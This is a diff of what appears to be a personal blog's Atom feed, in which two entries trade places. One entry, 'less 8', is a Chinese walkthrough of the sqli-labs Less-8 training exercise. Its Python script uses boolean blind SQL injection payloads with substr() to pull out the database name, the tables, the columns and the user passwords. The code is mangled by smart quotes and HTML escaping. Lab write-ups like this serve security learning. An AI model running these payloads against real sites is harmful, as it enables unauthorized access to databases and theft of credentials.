@@ -169,19 +169,12 @@ f</summary>
   </entry>
   
   <entry>
-    <title>less 8</title>
-    <link href="http://example.com/1970/01/01/less8/"/>
-    <id>http://example.com/1970/01/01/less8/</id>
+    <title>My New Post</title>
+    <link href="http://example.com/1970/01/01/My-New-Post/"/>
+    <id>http://example.com/1970/01/01/My-New-Post/</id>
     <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-21T03:22:31.991Z</updated>
+    <updated>2021-10-09T01:50:45.158Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
-      
     
     
     
@@ -209,12 +202,19 @@ f</summary>
   </entry>
   
   <entry>
-    <title>My New Post</title>
-    <link href="http://example.com/1970/01/01/My-New-Post/"/>
-    <id>http://example.com/1970/01/01/My-New-Post/</id>
+    <title>less 8</title>
+    <link href="http://example.com/1970/01/01/less8/"/>
+    <id>http://example.com/1970/01/01/less8/</id>
     <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-10-09T01:50:45.158Z</updated>
+    <updated>2021-11-21T03:22:31.991Z</updated>
     
+    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
+      
     
     
     
